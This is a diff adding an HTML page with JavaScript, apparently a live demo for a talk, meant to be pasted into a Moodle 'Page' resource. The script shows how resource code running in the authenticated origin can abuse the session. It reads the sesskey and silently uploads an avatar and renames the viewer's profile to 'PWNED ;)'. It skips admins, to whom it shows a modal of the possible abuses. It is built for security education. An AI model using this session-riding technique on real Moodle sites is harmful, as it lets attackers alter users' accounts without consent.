@@ -1,0 +1,180 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<title>Recurso interactivo (demo de charla)</title>
+</head>
+<body>
+<h2>Recurso interactivo</h2>
+<p>Este recurso educativo contiene JavaScript. En una charla sirve para mostrar, de forma
+inofensiva y reversible, qué puede hacer el código de un recurso cuando se ejecuta en el
+mismo origen autenticado del LMS.</p>
+
+<!--
+  evil-page-auto.html — DEMO EN VIVO para charla. PoC inofensiva, reversible y autocontenida.
+  Pégalo como recurso "Página" (mod_page) de Moodle, o embébelo en modo legacy.
+
+  Comportamiento al cargar (auto, sin botones):
+   - Si la persona usuaria tiene rol de administración/gestión: NO ejecuta nada; muestra un
+     modal explicando, por responsabilidad, lo que se PODRÍA haber hecho.
+   - En caso contrario (cuenta de demo sin privilegios): aplica un efecto inofensivo y
+     reversible — voltea la página en horizontal (flip/espejo) y cambia su PROPIO nombre
+     y foto de perfil.
+
+  No exfiltra nada, no ataca a terceros, no toca cuentas ajenas; solo la propia y de forma
+  reversible. La URL de la imagen va partida en trozos para que el filtro "URL a enlace" de
+  Moodle (filter_urltolink) no la convierta en <a> y rompa el script.
+-->
+<script>
+(function () {
+  'use strict';
+
+  // --- Resolver la ventana de Moodle (top window en mod_page; parent en iframe legacy) ---
+  function moodleWin() {
+    try { if (window.M && window.M.cfg && window.M.cfg.sesskey) { return window; } } catch (e) {}
+    try { if (window.parent && window.parent.M && window.parent.M.cfg && window.parent.M.cfg.sesskey) { return window.parent; } } catch (e) {}
+    return null;
+  }
+  var W = moodleWin();
+  if (!W) {
+    return showCard('🧪 Demo', 'Abre este recurso <b>dentro de Moodle</b> (recurso «Página» o Etiqueta) y con la sesión iniciada. Aquí no hay contexto de Moodle que demostrar.', document);
+  }
+  var D = W.document;
+  var cfg = W.M.cfg;
+  var uid = cfg.userId;
+  var sk = cfg.sesskey;
+  var root = cfg.wwwroot || W.location.origin;
+
+  // --- ¿La persona usuaria tiene rol de administración/gestión? (ve el enlace de admin) ---
+  function isHighPrivilege() {
+    try {
+      var as = D.querySelectorAll('a[href]');
+      for (var i = 0; i < as.length; i++) {
+        var h = as[i].getAttribute('href') || '';
+        if (/\/admin\/(search|index|user)\.php/.test(h)) { return true; }
+      }
+      return false;
+    } catch (e) { return false; }
+  }
+
+  if (isHighPrivilege()) { return adminGuardrail(); }
+
+  // === Cuenta sin privilegios: efecto inofensivo y reversible ===
+  flipPage();
+  changeOwnProfile();
+  banner('PoC en vivo · inofensiva y reversible · solo para la charla. Recarga para deshacer el flip; el nombre y la foto se revierten desde el perfil.');
+
+  // ---------- efectos ----------
+  function flipPage() {
+    try {
+      var b = D.body;
+      b.style.transition = 'transform 1.2s ease';
+      b.style.transformOrigin = '50% 50%';
+      b.style.transform = 'scaleX(-1)';   // espejo horizontal (sobre <body>: Chrome no pinta transform en <html>)
+    } catch (e) {}
+  }
+
+  // Imagen embebida (data-URI base64): cuadrado rojo con "!" — SIN peticiones externas (lab sin internet).
+  // El filtro filter_urltolink de Moodle no toca data: (solo http/https/www), asi que no se mangla.
+  var IMG = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGAAAABgCAIAAABt+uBvAAABEklEQVR42u3d0Q2CMBQF0NI4AsziGo7qGDoLDOEABEJMpFd67qfxx5P32ldDdXiNY5HtVASAAAEClJvb+qXnsnTL8Vjt6SpIiwE6ew3a78nrZX/NVUFaDBAgQIAAAQIk30zSv859no+87T1NKkiLAQIESAABAgQIECBAgAQQIECAAAECBAiQAAIECBAgQIAACSBAgAABAgQIkAACVK7wIHnDJ8RVECBAgAABss2XVnfHQiaAmqlTDt+16wJoyyLBqMbqhBjV/DurbY3sYoAAAeoY6Mg02HZibF9B+5+/+Twd0WJbCgmnjZQ1aG0RchYLOqxmfj9tFwMECFDwIt3zb0urIECATsjgn1lUECBAgAD9bT55DysbWIHcVwAAAABJRU5ErkJggg==';
+  function dataUriToBlob(uri) { var p = uri.split(','), bin = atob(p[1]), a = new Uint8Array(bin.length); for (var i = 0; i < bin.length; i++) { a[i] = bin.charCodeAt(i); } return new Blob([a], { type: 'image/png' }); }
+  function swapAvatars() {  // cambio cosmetico EN VIVO (inmediato, sin recargar) — resiliente a los dos tipos de avatar
+    try {
+      // a) Cuentas CON foto: el avatar es un <img> → reemplaza el src.
+      var imgs = D.querySelectorAll('img.userpicture, .usermenu img, img[src*="/user/icon"], img[src*="pluginfile.php"][src*="user"], img[src*="/u/"]');
+      for (var i = 0; i < imgs.length; i++) { imgs[i].src = IMG; imgs[i].srcset = ''; imgs[i].style.outline = '2px solid #c00'; }
+      // b) Cuentas SIN foto: Moodle pinta un circulo con iniciales en un <span>/<div>,
+      //    no hay <img> que cambiar → pintamos la imagen de fondo y ocultamos las iniciales.
+      var spans = D.querySelectorAll('.userinitials, .avatar, [class*="initials"]');
+      for (var j = 0; j < spans.length; j++) {
+        var el = spans[j];
+        if (el.tagName === 'IMG') { continue; }   // ya tratado en (a)
+        el.style.backgroundImage = 'url("' + IMG + '")';
+        el.style.backgroundColor = '#c00';        // respaldo si la imagen no carga
+        el.style.backgroundSize = 'cover';
+        el.style.backgroundPosition = 'center';
+        el.style.color = 'transparent';           // oculta las iniciales
+        el.style.outline = '2px solid #c00';
+      }
+    } catch (e) {}
+  }
+  function changeOwnProfile() {
+    swapAvatars();                  // 1) efecto visible al instante
+    try {
+      var blob = dataUriToBlob(IMG); // 2) cambio PERSISTENTE (nombre + foto)
+      W.fetch(root + '/user/edit.php?id=' + uid, { credentials: 'same-origin' })
+        .then(function (r) { return r.text(); })
+        .then(function (html) {
+              var doc = new DOMParser().parseFromString(html, 'text/html');
+              var forms = [].slice.call(doc.querySelectorAll('form'));
+              var form = forms.filter(function (f) { return f.querySelector('input[name^="_qf__"]'); })
+                              .sort(function (a, b) { return b.querySelectorAll('input,select,textarea').length - a.querySelectorAll('input,select,textarea').length; })[0];
+              var itemEl = form && form.querySelector('input[name=imagefile]');
+              if (!itemEl) { return; }
+              var itemid = itemEl.value;
+              var repoId = (function () { var k = html.indexOf('"type":"upload"'); if (k < 0) { return '5'; } var bb = html.slice(Math.max(0, k - 300), k); var m = bb.match(/"id":"?(\d+)"?[^{}]*$/); return m ? m[1] : '5'; })();
+              var ufd = new FormData();
+              ufd.append('repo_upload_file', blob, 'alert.png'); ufd.append('sesskey', sk); ufd.append('repo_id', repoId);
+              ufd.append('itemid', itemid); ufd.append('savepath', '/'); ufd.append('title', 'alert.png'); ufd.append('author', 'PoC'); ufd.append('license', 'unknown');
+              return W.fetch(root + '/repository/repository_ajax.php?action=upload', { method: 'POST', credentials: 'same-origin', body: ufd })
+                .then(function (r) { return r.json(); })
+                .then(function () {
+                  var fd = new FormData(form); fd.delete('cancel'); fd.set('submitbutton', '1');
+                  if (fd.has('firstname')) { fd.set('firstname', 'PWNED ;)'); }   // cambia también el nombre
+                  var act = new URL(form.getAttribute('action') || (root + '/user/edit.php'), root + '/user/edit.php?id=' + uid).href;
+                  return W.fetch(act, { method: 'POST', credentials: 'same-origin', body: fd });
+                });
+            }).catch(function () {});
+    } catch (e) {}
+  }
+
+  // ---------- guardarraíl para administración ----------
+  function adminGuardrail() {
+    var body =
+      '<p>Por <b>responsabilidad</b>, este código <b>no ha ejecutado nada</b> en tu cuenta.</p>' +
+      '<p>Pero, al correr en el <b>origen autenticado</b> de Moodle con tus privilegios, ' +
+      '<b>se podría haber</b>:</p>' +
+      '<ul style="text-align:left;line-height:1.6;margin:.4em 0 1em">' +
+      '<li>creado cursos y matriculado al alumnado de forma automática;</li>' +
+      '<li>cambiado tu nombre y tu foto de perfil;</li>' +
+      '<li>modificado cuentas de otras personas o la configuración del sitio;</li>' +
+      '<li>enviado mensajes en tu nombre.</li></ul>' +
+      '<p style="margin:0">Esa es la diferencia entre <b>confiar</b> y <b>no confiar</b> en el JavaScript del recurso. ' +
+      '<em>Demo inofensiva: nada de esto se ha hecho.</em></p>';
+    showCard('🛡️ Persona con rol de administración detectada', body, D);
+  }
+
+  // ---------- UI ----------
+  function showCard(title, bodyHtml, doc) {
+    try {
+      var host = doc.createElement('div');
+      host.setAttribute('data-exe-demo', '1');
+      host.style.cssText = 'position:fixed;inset:0;z-index:2147483647;display:flex;align-items:center;' +
+        'justify-content:center;background:rgba(0,0,0,.55);font:15px/1.45 system-ui,Arial,sans-serif';
+      host.innerHTML =
+        '<div style="max-width:560px;width:92%;background:#fff;color:#161616;border-radius:14px;' +
+        'padding:22px 24px;box-shadow:0 18px 60px rgba(0,0,0,.5);box-sizing:border-box">' +
+        '<h2 style="margin:0 0 10px;font-size:20px">' + title + '</h2>' +
+        bodyHtml +
+        '<div style="text-align:right;margin-top:14px">' +
+        '<button type="button" style="border:0;background:#1A3E6E;color:#fff;border-radius:8px;' +
+        'padding:8px 18px;font-size:15px;cursor:pointer">Cerrar</button></div></div>';
+      var btn = host.querySelector('button');
+      if (btn) { btn.addEventListener('click', function () { if (host.parentNode) { host.parentNode.removeChild(host); } }); }
+      (doc.body || doc.documentElement).appendChild(host);
+    } catch (e) {}
+  }
+
+  function banner(txt) {
+    try {
+      var el = D.createElement('div');
+      el.style.cssText = 'position:fixed;left:0;right:0;bottom:0;z-index:2147483646;background:#1A3E6E;' +
+        'color:#fff;font:13px/1.4 system-ui,Arial,sans-serif;padding:8px 12px;text-align:center';
+      el.textContent = txt;
+      (D.documentElement || D.body).appendChild(el);   // fuera de <body> → no rota con el giro
+    } catch (e) {}
+  }
+})();
+</script>
+</body>
+</html>
